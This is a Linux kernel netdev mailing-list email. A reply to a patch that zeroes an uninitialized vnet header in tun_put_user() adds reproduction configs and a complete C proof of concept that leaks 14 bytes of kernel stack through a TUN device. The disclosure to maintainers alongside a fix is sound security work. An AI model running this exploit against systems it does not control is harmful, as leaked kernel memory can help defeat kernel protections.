Return-Path: <netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id kaLGHPgFJWpoCwIAu9opvQ
	(envelope-from <netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:47:36 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [172.232.135.74])
	by mail.lfdr.de (Postfix) with ESMTPS id 08D2E64EE45
	for <lists+netdev@lfdr.de>; Sun, 07 Jun 2026 07:47:36 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=asu.edu header.s=google header.b=aaTfNh4y;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org" designates 172.232.135.74 as permitted sender) smtp.mailfrom="netdev+bounces-296182-lists+netdev=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=asu.edu;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id 4E686300C014
	for <lists+netdev@lfdr.de>; Sun,  7 Jun 2026 05:47:35 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 985D928688C;
	Sun,  7 Jun 2026 05:47:32 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2376E4071C7
	for <netdev@vger.kernel.org>; Sun,  7 Jun 2026 05:47:30 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780811252; cv=none; b=G7SadDf1HxKCZsTmIcLn5zb6Qr2LsVQjXHAiM71qd8FH7Xdei4XTDMaPAw0gZlpVabvfVGYAFg5hxOGPxFUAoMqFMAcJH2xyHNTf4jhYY1/GB+DwOHSLtp0StgeCKRhioLaMBS7bb+UnlY2z4OIpI3PF4qci3PU5Q1KRj/Lhq3w=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780811252; c=relaxed/simple;
	bh=QT2Loc0Edw/Jx7OIIQXQMn1I5gRb253IW07qKN3VO0o=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=PEdugZeH2JTfgwNWIrWhPJGpYdmp9/QKKLX+AqPw8AJwb/V2YZOsOLjFZJDXm+uzvVfAD+AU+uB7hjeoDMBkoNZuOo+JQTpnWKh2cvVzYmtmp/oAC+zZGw1gxdYqbSIuBzKFuvCVhkOP5kq8FniIf69ISAViEyhqUX5ro9AjOIU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=aaTfNh4y; arc=none smtp.client-ip=209.85.214.173
Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2c0c379e8ffso21800335ad.3
        for <netdev@vger.kernel.org>; Sat, 06 Jun 2026 22:47:30 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1780811250; x=1781416050; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=HH2zvhwm+P9D3XVeeSt2250hPt28MK4EwTvB6hA2NNk=;
        b=aaTfNh4y2wUZz0Z1bCH3azao6WRFHpW0/RfXlCORXQVGAy2ih64apujy6EicTepRlD
         DcBNhcuuCyC++VJA4XPx195eev28lliXDjJrf6zfE7RgYQ1uI/SYl+44u/x5FqHHR6uH
         CbZB2Z4cy5aUUKQX1/LlIwRfyC5Rvc8SbQRbMTRr3d0+gK+nq791ZEtluXD12n5kyGQ3
         Sq/yyEkTAKCGLOoVt9swKM2y7paDJ8VPoKPR3NXImG++bydF/WXyJJVa6U+LSuy4hJ0T
         N2+ujoEQaMzCV1iOmHzMkfcQVUMuFVm9kuN7nWVOpQTbC7pxAiuySLKSdd0c+ONjWaTv
         J4Sw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780811250; x=1781416050;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=HH2zvhwm+P9D3XVeeSt2250hPt28MK4EwTvB6hA2NNk=;
        b=jhjhsxcdNEztlGEzds9U+9m5Jfaz9jnjTGgC4gBvUFA3LZefYYtj9B1CvpfxV0nkvl
         CDZQZsh6+oyRAdS+zxsFOlAQHUDMOq7zneC12eGHJM0a7ofl0lf2y5q5ogFpDd5YMTHr
         oWx6URbffJ9jYOGd7t64mnoxIyRuBO0xWigoMI+YbZ3lFRIqfYefP3WHW97Z48mk0Thy
         h+CpZ6efIHU25Y5yxiXOKW1UfxoJRcFuX50hz3iaNgvwGC9yN8cxrUbxpQ6C1yVIouQ2
         KQR1gVy0gzhlXT9rfDUjl6goJfVcIYBqpuehagdVOwGFfWw/ge2m645jZ3noxJAh3bBX
         G5rg==
X-Gm-Message-State: AOJu0YzCm41PGmo3g0B88IbFs2G+jBdtsjsdkKi0xm1q/aQG4j9Tb0Je
	Ee6G+tRy1TbFPsRVU+nSSxAws5URta862GoazsATbAgo+1lPLowyNI2Gb6fOAqLwo4CCPxFGuXd
	ec/Y8mA==
X-Gm-Gg: Acq92OE4up0/n45cOHCBpS3G6dEU6a0fVpZKkvF/kAkubG1b8Y8TZnHy4xdfShbu4OZ
	ABypDCfvmzmuiZo9hX1Oi4ibzjvtoPLxM7Yocakcp1YpAivSxyMUFlO9NLttyk0KkeVBrwP7M63
	wN/+YMRAXl5GFAoZdb3Gndzg7YL527Ef4CIqavjKkFJSR4jBMNjVdxLLoIq2c4xQRSnSFbaot/Z
	owFe4VvD0EtSNHFji1lyNFhR61M8ht6kQebV+pN6cmX2ga0M/LwlWYz5GKNOGq5R656sC1TR4dZ
	zjqW6rzy7KBdEyszanAtWfRhg6P9KJN8hHbvpiJQ26aPH6F+dmkhx75o1S01J7SU+43tlLTUvQg
	5GhpIDFfysWwBuEnuVv5EnKfgRp1mIhvLZSsagy6UdR0IDA9woNnbS1JUKeB1fI2jxRUUJliPgZ
	9tyf5WgBrUdeNZ
X-Received: by 2002:a17:902:f611:b0:2c0:b5c1:8e3e with SMTP id d9443c01a7336-2c1e78e4f03mr126729765ad.8.1780811250283;
        Sat, 06 Jun 2026 22:47:30 -0700 (PDT)
Received: from p1 ([73.140.210.38])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2c164f6d2bbsm148733785ad.1.2026.06.06.22.47.29
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 06 Jun 2026 22:47:30 -0700 (PDT)
Date: Sat, 6 Jun 2026 22:47:28 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: Willem de Bruijn <willemdebruijn.kernel@gmail.com>, 
	Jason Wang <jasowang@redhat.com>, Paolo Abeni <pabeni@redhat.com>, 
	Andrew Lunn <andrew+netdev@lunn.ch>, Eric Dumazet <edumazet@google.com>, 
	Jakub Kicinski <kuba@kernel.org>, bestswngs@gmail.com
Subject: Re: [PATCH net] tun: zero the whole vnet header in tun_put_user()
Message-ID: <6y7bzuxolego45yjpjgw25zmyiioluixbjs2uiuqu7yfxaygaa@aozvxajlok4g>
References: <20260607054428.3050243-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260607054428.3050243-1-xmei5@asu.edu>
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-0.16 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	MID_RHS_NOT_FQDN(0.50)[];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	R_SPF_ALLOW(-0.20)[+ip4:172.232.135.74];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[gmail.com,redhat.com,lunn.ch,google.com,kernel.org];
	TAGGED_FROM(0.00)[bounces-296182-lists,netdev=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	FROM_HAS_DN(0.00)[];
	FORGED_SENDER(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	MIME_TRACE(0.00)[0:+];
	FORGED_RECIPIENTS(0.00)[m:netdev@vger.kernel.org,m:willemdebruijn.kernel@gmail.com,m:jasowang@redhat.com,m:pabeni@redhat.com,m:andrew+netdev@lunn.ch,m:edumazet@google.com,m:kuba@kernel.org,m:bestswngs@gmail.com,m:willemdebruijnkernel@gmail.com,m:andrew@lunn.ch,s:lists@lfdr.de];
	FORWARDED(0.00)[lists@lfdr.de];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	MISSING_XM_UA(0.00)[];
	TO_DN_SOME(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.232.128.0/19, country:SG];
	RCPT_COUNT_SEVEN(0.00)[8];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[asu.edu:dkim,asu.edu:from_mime,asu.edu:email,sto.lore.kernel.org:helo,sto.lore.kernel.org:rdns]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: 08D2E64EE45

On Sat, Jun 06, 2026 at 10:44:28PM -0700, Xiang Mei wrote:
> tun_put_user() declares an on-stack struct virtio_net_hdr_v1_hash_tunnel
> without zeroing it. For a non-tunnel skb, virtio_net_hdr_tnl_from_skb()
> only initializes the first 10 bytes (sizeof(struct virtio_net_hdr)),
> leaving bytes 10..23 (num_buffers and the hash/tunnel fields) as stack
> garbage.
> 
> An unprivileged user can set the vnet header size to 24 with
> TUNSETVNETHDRSZ, so __tun_vnet_hdr_put() copies all 24 bytes of the
> partially-initialized struct to userspace, leaking 14 bytes of kernel
> stack on every read of a non-tunnel packet.
> 
> Fix it the same way tun_get_user() already does by zeroing the whole
> header right after declaration.
> 
> Fixes: 288f30435132 ("tun: enable gso over UDP tunnel support.")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-8
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  drivers/net/tun.c | 1 +
>  1 file changed, 1 insertion(+)
> 
> diff --git a/drivers/net/tun.c b/drivers/net/tun.c
> index 9e7744eb57a3..fed9dfdfcc3b 100644
> --- a/drivers/net/tun.c
> +++ b/drivers/net/tun.c
> @@ -2070,6 +2070,7 @@ static ssize_t tun_put_user(struct tun_struct *tun,
>  		struct virtio_net_hdr_v1_hash_tunnel hdr;
>  		struct virtio_net_hdr *gso;
>  
> +		memset(&hdr, 0, sizeof(hdr));
>  		ret = tun_vnet_hdr_tnl_from_skb(tun->flags, tun->dev, skb,
>  						&hdr);
>  		if (ret)
> -- 
> 2.43.0
>
Thanks for your attention to this bug. Here are some information to
reproduce it.

Configs:
```
CONFIG_TUN=y
CONFIG_INIT_STACK_ALL_ZERO=n
```

PoC:
```c
// PoC: kernel stack info leak in tun_put_user via uninitialized
// virtio_net_hdr_v1_hash_tunnel fields. drivers/net/tun.c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <net/if.h>
#include <linux/if_tun.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#define TUN_F_UDP_TUNNEL_GSO 0x080

int main(void)
{
    int fd = open("/dev/net/tun", O_RDWR);
    struct ifreq ifr = { .ifr_flags = IFF_TUN | IFF_NO_PI | IFF_VNET_HDR };
    strcpy(ifr.ifr_name, "tun0");
    ioctl(fd, TUNSETIFF, &ifr);

    int sz = 24;
    ioctl(fd, TUNSETVNETHDRSZ, &sz);
    ioctl(fd, TUNSETOFFLOAD, TUN_F_CSUM | TUN_F_TSO4 | TUN_F_TSO6 | TUN_F_UDP_TUNNEL_GSO);

    // bring tun0 up with 10.99.0.1/24 so a UDP packet routes into it
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in *a = (void *)&ifr.ifr_addr;
    a->sin_family = AF_INET;
    a->sin_addr.s_addr = inet_addr("10.99.0.1");
    ioctl(s, SIOCSIFADDR, &ifr);
    a->sin_addr.s_addr = inet_addr("255.255.255.0");
    ioctl(s, SIOCSIFNETMASK, &ifr);
    ioctl(s, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);

    // send a UDP packet that gets routed out through tun0
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(1234),
                               .sin_addr.s_addr = inet_addr("10.99.0.2") };
    char pkt[128];
    memset(pkt, 0x41, sizeof(pkt));
    sendto(s, pkt, sizeof(pkt), 0, (void *)&dst, sizeof(dst));

    // read it back; bytes 10..23 of the vnet hdr should be zero but leak stack
    unsigned char buf[4096];
    for (int i = 0; i < 200; i++) {
        sendto(s, pkt, sizeof(pkt), 0, (void *)&dst, sizeof(dst));
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n < sz) continue;
        int leak = 0;
        for (int j = 10; j < 24; j++) leak |= buf[j];
        if (!leak) continue;
        printf("[+] leak: ");
        for (int j = 10; j < 24; j++) printf("%02x ", buf[j]);
        printf("\n");
        return 0;
    }
    printf("[-] no leak observed\n");
    return 1;
}
```

Let me know if you have any questions about this bug.

Xiang



